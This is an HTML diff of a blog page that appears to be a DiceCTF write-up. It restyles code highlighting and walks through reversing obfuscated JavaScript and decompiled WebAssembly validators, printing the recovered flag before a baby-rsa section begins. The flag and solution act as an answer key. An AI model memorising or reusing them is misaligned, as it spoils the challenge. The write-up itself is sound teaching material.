+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">function</span> c(b) {
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">var</span> e <span style="color:#555">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;HLPDd&#39;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">function</span>(g, h) {
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> g <span style="color:#555">===</span> h;
-</span></span><span style="display:flex;"><span>        },
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;tIDVT&#39;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">function</span>(g, h) {
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> g(h);
-</span></span><span style="display:flex;"><span>        },
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;QIMdf&#39;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">function</span>(g, h) {
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> g <span style="color:#555">-</span> h;
-</span></span><span style="display:flex;"><span>        },
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;FIzyt&#39;</span><span style="color:#555">:</span> <span style="color:#c30">&#39;int&#39;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;oRXGA&#39;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">function</span>(g, h) {
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> g <span style="color:#555">&lt;&lt;</span> h;
-</span></span><span style="display:flex;"><span>        },
-</span></span><span style="display:flex;"><span>        <span style="color:#c30">&#39;AMINk&#39;</span><span style="color:#555">:</span> <span style="color:#069;font-weight:bold">function</span>(g, h) {
-</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> g <span style="color:#555">&amp;</span> h;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>      , f <span style="color:#555">=</span> current_guess;
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">try</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">let</span> g <span style="color:#555">=</span> e[<span style="color:#c30">&#39;HLPDd&#39;</span>](btoa(e[<span style="color:#c30">&#39;tIDVT&#39;</span>](intArrayToString, <span style="color:#366">window</span>[b](b[e[<span style="color:#c30">&#39;QIMdf&#39;</span>](f, <span style="color:#f60">0x26f4</span> <span style="color:#555">+</span> <span style="color:#f60">0x1014</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x3707</span> <span style="color:#555">*</span> <span style="color:#f60">0x1</span>)], e[<span style="color:#c30">&#39;FIzyt&#39;</span>])()[<span style="color:#c30">&#39;toString&#39;</span>](e[<span style="color:#c30">&#39;oRXGA&#39;</span>](e[<span style="color:#c30">&#39;AMINk&#39;</span>](f, <span style="color:#555">-</span><span style="color:#f60">0x1a3</span> <span style="color:#555">*</span> <span style="color:#555">-</span><span style="color:#f60">0x15</span> <span style="color:#555">+</span> <span style="color:#f60">0x82e</span> <span style="color:#555">*</span> <span style="color:#555">-</span><span style="color:#f60">0x1</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x1a2d</span>), <span style="color:#f60">0x124d</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x1aca</span> <span style="color:#555">+</span> <span style="color:#f60">0x87f</span>))[<span style="color:#c30">&#39;match&#39;</span>](<span style="color:#3aa">/.{2}/g</span>)[<span style="color:#c30">&#39;map&#39;</span>](h=&gt;<span style="color:#366">parseInt</span>(h, f <span style="color:#555">*</span> f)))), <span style="color:#c30">&#39;ZGljZQ==&#39;</span>) <span style="color:#555">?</span> <span style="color:#555">-</span><span style="color:#f60">0x1</span> <span style="color:#555">*</span> <span style="color:#f60">0x1d45</span> <span style="color:#555">+</span> <span style="color:#f60">0x2110</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x3ca</span> <span style="color:#555">:</span> <span style="color:#555">-</span><span style="color:#f60">0x9</span> <span style="color:#555">*</span> <span style="color:#f60">0x295</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x15</span> <span style="color:#555">*</span> <span style="color:#555">-</span><span style="color:#f60">0x3</span> <span style="color:#555">+</span> <span style="color:#f60">0x36</span> <span style="color:#555">*</span> <span style="color:#f60">0x6d</span>;
-</span></span><span style="display:flex;"><span>    } <span style="color:#069;font-weight:bold">catch</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0x1b3c</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0xc9</span> <span style="color:#555">*</span> <span style="color:#f60">0x2f</span> <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">0x19</span> <span style="color:#555">*</span> <span style="color:#555">-</span><span style="color:#f60">0x63</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">c</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;HLPDd&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">,</span> <span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">g</span> <span class="o">===</span> <span class="nx">h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;tIDVT&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">,</span> <span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">g</span><span class="p">(</span><span class="nx">h</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;QIMdf&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">,</span> <span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">g</span> <span class="o">-</span> <span class="nx">h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;FIzyt&#39;</span><span class="o">:</span> <span class="s1">&#39;int&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;oRXGA&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">,</span> <span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">g</span> <span class="o">&lt;&lt;</span> <span class="nx">h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;AMINk&#39;</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">g</span><span class="p">,</span> <span class="nx">h</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">g</span> <span class="o">&amp;</span> <span class="nx">h</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">,</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">current_guess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">e</span><span class="p">[</span><span class="s1">&#39;HLPDd&#39;</span><span class="p">](</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="s1">&#39;tIDVT&#39;</span><span class="p">](</span><span class="nx">intArrayToString</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="nx">b</span><span class="p">](</span><span class="nx">b</span><span class="p">[</span><span class="nx">e</span><span class="p">[</span><span class="s1">&#39;QIMdf&#39;</span><span class="p">](</span><span class="nx">f</span><span class="p">,</span> <span class="mh">0x26f4</span> <span class="o">+</span> <span class="mh">0x1014</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x3707</span> <span class="o">*</span> <span class="mh">0x1</span><span class="p">)],</span> <span class="nx">e</span><span class="p">[</span><span class="s1">&#39;FIzyt&#39;</span><span class="p">])()[</span><span class="s1">&#39;toString&#39;</span><span class="p">](</span><span class="nx">e</span><span class="p">[</span><span class="s1">&#39;oRXGA&#39;</span><span class="p">](</span><span class="nx">e</span><span class="p">[</span><span class="s1">&#39;AMINk&#39;</span><span class="p">](</span><span class="nx">f</span><span class="p">,</span> <span class="o">-</span><span class="mh">0x1a3</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x15</span> <span class="o">+</span> <span class="mh">0x82e</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x1</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x1a2d</span><span class="p">),</span> <span class="mh">0x124d</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x1aca</span> <span class="o">+</span> <span class="mh">0x87f</span><span class="p">))[</span><span class="s1">&#39;match&#39;</span><span class="p">](</span><span class="sr">/.{2}/g</span><span class="p">)[</span><span class="s1">&#39;map&#39;</span><span class="p">](</span><span class="nx">h</span><span class="p">=&gt;</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="nx">f</span> <span class="o">*</span> <span class="nx">f</span><span class="p">)))),</span> <span class="s1">&#39;ZGljZQ==&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="o">-</span><span class="mh">0x1</span> <span class="o">*</span> <span class="mh">0x1d45</span> <span class="o">+</span> <span class="mh">0x2110</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x3ca</span> <span class="o">:</span> <span class="o">-</span><span class="mh">0x9</span> <span class="o">*</span> <span class="mh">0x295</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x15</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x3</span> <span class="o">+</span> <span class="mh">0x36</span> <span class="o">*</span> <span class="mh">0x6d</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mh">0x1b3c</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0xc9</span> <span class="o">*</span> <span class="mh">0x2f</span> <span class="o">+</span> <span class="o">-</span><span class="mh">0x19</span> <span class="o">*</span> <span class="o">-</span><span class="mh">0x63</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>The simplified version psuedocode is below</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>our_input <span style="color:#555">=</span> b;
-</span></span><span style="display:flex;"><span>f <span style="color:#555">=</span> current_guess;
-</span></span><span style="display:flex;"><span>intArrayToString(<span style="color:#366">window</span>[our_input](our_input[f<span style="color:#555">-</span><span style="color:#f60">1</span>], <span style="color:#c30">&#39;int&#39;</span>)().toString((f <span style="color:#555">&amp;</span> <span style="color:#f60">4</span>) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">2</span>)).match(<span style="color:#3aa">/.{2}/g</span>).map(h=&gt;<span style="color:#366">parseInt</span>(h, f<span style="color:#555">*</span>f)) <span style="color:#555">===</span> <span style="color:#c30">&#34;dice{&#34;</span>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">our_input</span> <span class="o">=</span> <span class="nx">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">f</span> <span class="o">=</span> <span class="nx">current_guess</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">intArrayToString</span><span class="p">(</span><span class="nb">window</span><span class="p">[</span><span class="nx">our_input</span><span class="p">](</span><span class="nx">our_input</span><span class="p">[</span><span class="nx">f</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;int&#39;</span><span class="p">)().</span><span class="nx">toString</span><span class="p">((</span><span class="nx">f</span> <span class="o">&amp;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)).</span><span class="nx">match</span><span class="p">(</span><span class="sr">/.{2}/g</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">h</span><span class="p">=&gt;</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">h</span><span class="p">,</span> <span class="nx">f</span><span class="o">*</span><span class="nx">f</span><span class="p">))</span> <span class="o">===</span> <span class="s2">&#34;dice{&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Deduction from the function:</p>
@@ -562,63 +591,63 @@ From our deduction, we can conclude that basically, what it do is:</li>
 <li>The result should be <strong>dice{</strong></li>
 </ul>
 <p>To get the fourth word, what I do is try it one by one all fields in the <strong>Window</strong> object which has length 5 char. After some bruteforcing, I found that the correct field is <strong>cwrap</strong>, which will be our fourth word.</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uint export<span style="color:#555">::</span>validate_5(undefined4 param1,undefined4 param2,undefined4 param3,undefined4 param4,
-</span></span><span style="display:flex;"><span>                       <span style="color:#078;font-weight:bold">int</span> param5)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  uint uVar1;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((((<span style="color:#078;font-weight:bold">char</span>)param1 <span style="color:#555">==</span> <span style="color:#c30">&#39;m&#39;</span>) <span style="color:#555">&amp;&amp;</span> ((<span style="color:#078;font-weight:bold">char</span>)param2 <span style="color:#555">==</span> <span style="color:#c30">&#39;@&#39;</span>)) <span style="color:#555">&amp;&amp;</span> ((<span style="color:#078;font-weight:bold">char</span>)param3 <span style="color:#555">==</span> <span style="color:#c30">&#39;x&#39;</span>)) {
-</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#555">=</span> (uint)(param5 <span style="color:#555">==</span> <span style="color:#f60">0x4d</span> <span style="color:#555">&amp;&amp;</span> (<span style="color:#078;font-weight:bold">char</span>)param4 <span style="color:#555">==</span> <span style="color:#c30">&#39;!&#39;</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar1;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uint</span> <span class="n">export</span><span class="o">::</span><span class="n">validate_5</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param1</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param2</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param3</span><span class="p">,</span><span class="n">undefined4</span> <span class="n">param4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                       <span class="kt">int</span> <span class="n">param5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((((</span><span class="kt">char</span><span class="p">)</span><span class="n">param1</span> <span class="o">==</span> <span class="sc">&#39;m&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">param2</span> <span class="o">==</span> <span class="sc">&#39;@&#39;</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">char</span><span class="p">)</span><span class="n">param3</span> <span class="o">==</span> <span class="sc">&#39;x&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param5</span> <span class="o">==</span> <span class="mh">0x4d</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">param4</span> <span class="o">==</span> <span class="sc">&#39;!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can see that the fifth word is <strong>m@x!M</strong></p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uint export<span style="color:#555">::</span>validate_6(<span style="color:#078;font-weight:bold">int</span> param1,<span style="color:#078;font-weight:bold">int</span> param2,<span style="color:#078;font-weight:bold">int</span> param3,<span style="color:#078;font-weight:bold">int</span> param4,<span style="color:#078;font-weight:bold">int</span> param5)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  uint uVar1;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((param2 <span style="color:#555">+</span> <span style="color:#f60">0xb75</span>) <span style="color:#555">*</span> (param1 <span style="color:#555">+</span> <span style="color:#f60">0x6e3</span>) <span style="color:#555">==</span> <span style="color:#f60">0x53acdf</span>) {
-</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#555">=</span> (uint)(param5 <span style="color:#555">==</span> <span style="color:#f60">0x7d</span> <span style="color:#555">&amp;&amp;</span> (param4 <span style="color:#555">+</span> <span style="color:#f60">0x60a</span>) <span style="color:#555">*</span> (param3 <span style="color:#555">+</span> <span style="color:#f60">0xf49</span>) <span style="color:#555">==</span> <span style="color:#f60">0x62218f</span>);
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> uVar1;
-</span></span><span style="display:flex;"><span>}
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">uint</span> <span class="n">export</span><span class="o">::</span><span class="n">validate_6</span><span class="p">(</span><span class="kt">int</span> <span class="n">param1</span><span class="p">,</span><span class="kt">int</span> <span class="n">param2</span><span class="p">,</span><span class="kt">int</span> <span class="n">param3</span><span class="p">,</span><span class="kt">int</span> <span class="n">param4</span><span class="p">,</span><span class="kt">int</span> <span class="n">param5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">uVar1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">param2</span> <span class="o">+</span> <span class="mh">0xb75</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">param1</span> <span class="o">+</span> <span class="mh">0x6e3</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x53acdf</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">uVar1</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="n">param5</span> <span class="o">==</span> <span class="mh">0x7d</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">param4</span> <span class="o">+</span> <span class="mh">0x60a</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">param3</span> <span class="o">+</span> <span class="mh">0xf49</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x62218f</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">uVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>With some bruteforcing, we can found that the sixth word is <strong>T$r3}</strong>.</p>
@@ -626,295 +655,161 @@ From our deduction, we can conclude that basically, what it do is:</li>
 <blockquote>
 <p>Flag: dice{F!3lDd0Nu7cwrapm@x!MT$r3}</p>
 </blockquote>
-<h1 id="crypto">Crypto <a href="#crypto" class="anchor">#</a></h1>
-<h2 id="baby-rsa">baby-rsa <a href="#baby-rsa" class="anchor">#</a></h2>
+<h1 id="crypto">Crypto</h1>
+<h2 id="baby-rsa">baby-rsa</h2>
 <p>We were given this file</p>
-<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
